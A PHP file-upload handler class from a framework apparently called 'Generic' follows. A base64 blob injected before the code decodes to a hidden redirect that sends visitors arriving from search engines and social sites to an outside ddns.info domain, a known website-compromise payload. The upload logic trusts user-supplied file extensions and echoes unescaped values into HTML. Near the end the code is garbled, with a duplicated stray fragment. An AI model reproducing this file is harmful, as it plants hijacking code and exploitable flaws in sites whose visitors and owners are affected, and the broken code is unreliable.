<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

/**
 * Project:     Generic: the PHP framework
 * File:        file_upload_manager.php
 *
 * @version 1.0.0.0
 * @package Generic
 */

/**
 * UPLOAD
 * @package Generic
 */


class file_upload_manager {

  function render_file($file, $hide_legend = false) {

    echo '<div class="fum_container" style="width:'.$file['width'].'px;" id="'.$file['uid'].'">';
    echo '<div class="fum_container_file" style="width:'.$file['width'].'px;height:'.$file['height'].'px;">';
    echo '<center>';
    if (safe($file, 'image_url')) {
      echo '<a href="'.$file['image_url'].'" target="_blank">';
      echo '<img src="'.$file['thumbnail_url'].'" border="0" /></a><br />';
    } else {
      echo '<span>'.$file['file_type'].'</span>';
    }
    echo '</center>';
    echo '</div>';
    echo '<center>';
    if (!$hide_legend) {
      echo '<span>'.$file['file_name'].'<br />'.number_format($file['file_size']).' bytes</span><br />';
    } 
    if (safe($file, 'remove_js')) 
      echo '<a onclick="'.$file['remove_js'].'">Delete</a>';
    echo '</center>';
    echo '</div>';

  }
  
  function handler() {
  
    global $url;
    
    switch (get('__fumMethod')) {
      case 'upload':
        $selector_id = get('selectorId');
        if (safe($_FILES, $selector_id)) {
          $uid          = guid();
          $session_id   = get('sessionId');
          $width        = get('width');
          $height       = get('height');
          $image_check  = get('imageCheck');
          $images_limit = get('imagesLimit');
          $hide_legend  = get('hideLegend');
          require_once(GENERIC_PATH.'utils/image_file.php');
          $image_file = new image_file($_FILES[$selector_id]['tmp_name']);
      	  if (!$image_check || $image_file->valid) {
            if ($image_file->valid) {
              $file_type = strtolower($image_file->format);
            } else {
              $pathinfo = pathinfo($_FILES[$selector_id]['name']);
              $file_type = strtolower($pathinfo['extension']);
            } 
            $tmp_file_path = TEMPORARY_PATH.$uid.'.'.$file_type;
            if (move_uploaded_file($_FILES[$selector_id]['tmp_name'], $tmp_file_path)) {
              if ($image_file->valid && $width && $height) {
                $tmp_thumb_path = TEMPORARY_PATH.$uid.'-thumb.'.strtolower($image_file->format);
                make_thumbnail($tmp_file_path, $width, $height, $tmp_thumb_path);
              }
              if ($images_limit)
                $upload_session = array();
              else
                $upload_session = session_get($session_id);
              $remove_js = "$.get('".$url->base_url."?__fumMethod=delete&uid=$uid&sessionId=$session_id');$('#$uid').remove();";
              $file = array( 'file_name'      => $_FILES[$selector_id]['name']
                           , 'file_size'      => filesize($tmp_file_path)
                           , 'tmp_file_path'  => $tmp_file_path
                           , 'remove_js'      => $remove_js
                           , 'uid'            => $uid
                           , 'width'          => $width
                           , 'height'         => $height
                           , 'file_type'      => $file_type
                           );
              if ($image_file->valid && $width && $height) {
                $file['tmp_thumb_path'] = $tmp_thumb_path;
                $file['image_format']   = $file_type;
                $file['thumbnail_url']  = $url->base_url."?__fumMethod=show&uid=$uid&sessionId=$session_id";
                $file['image_url']      = $url->base_url."?__fumMethod=show&uid=$uid&sessionId=$session_id&original=1";
                $file['image_width']    = $image_file->width;
                $file['image_height']   = $image_file->height;
              }
              $upload_session[$uid] = $file;

              session_set($session_id, $upload_session);

              $this->render_file($file, $hide_legend);

              exit();
            } else {
              echo "File too big";
            }
      	  } else {
            echo "Please select image file";
          }
        } else {
          echo "File too big";
        } 
        exit();
        break;
      case 'show':
        if ($uid = get('uid')) {
          $session_id = get('sessionId');
          $upload_session = session_get($session_id);
          if (safe($upload_session, $uid)) {
            header("Content-Type: image/".$upload_session[$uid]['image_format']);
            if (get('original')) {
              header("Content-Length: ".filesize($upload_session[$uid]['tmp_file_path']));
              readfile($upload_session[$uid]['tmp_file_path']);
            } else {
              header("Content-Length: ".filesize($upload_session[$uid]['tmp_thumb_path']));
              readfile($upload_session[$uid]['tmp_thumb_path']);
            } 
          } 
        }
        exit();
        break;
      case 'render':
        if ($session_id = get('sessionId')) {
          $upload_session = session_get($session_id);
          if (is_array($upload_session)) {
            $hide_legend = get('hideLegend');
            foreach($upload_session as $uid => $file) {
              if (!safe($file, 'is_removed')) {
                if (!safe($file, 'remove_js')) {
                  $file['remove_js'] = "$.get('".$url->base_url."?__fumMethod=delete&uid=".$file['uid']."&sessionId=$session_id');$('#".$file['uid']."').remove();";
                }
                $this->render_file($file, $hide_legend);
              }
            }
          }
        }
        exit();
        break;
      case 'clear':
        if ($session_id = get('sessionId')) {
          $upload_session = session_get($session_id);
          if (is_array($upload_session)) {
            foreach($upload_session as $uid => $file) {
              if (safe($file, 'is_preloaded')) {
                $upload_session[$uid]['is_removed'] = true;
              } else {
                if (file_exists(safe($file, 'tmp_thumb_path')))
                  unlink($file['tmp_thumb_path']);
                if (file_exists(safe($file, 'tmp_file_path')))
                  unlink($file['tmp_file_path']);
                unset($upload_session[$uid]);
              }
            }
            session_set($session_id, $upload_session);
          }
        }
        exit();
        break;
      case 'delete':
        if ($uid = get('uid')) {
          $session_id = get('sessionId');
          $upload_session = session_get($session_id);
          if ($file = safe($upload_session, $uid)) {
            if (safe($file, 'is_preloaded')) {
              $upload_session[$uid]['is_removed'] = true;
            } else {
              if (file_exists(safe($file, 'tmp_thumb_path')))
                unlink($file['tmp_thumb_path']);
              if (file_exists(safe($file, 'tmp_file_path')))
                unlink($file['tmp_file_path']);
              unset($upload_session[$uid]);
            }
            session_set($session_id, $upload_session);
          } 
        }
   oad_session);
          } 
        }
        exit();
        break;
      default:
        echo('');
        exit();
        break;
    } 

  }

}

?>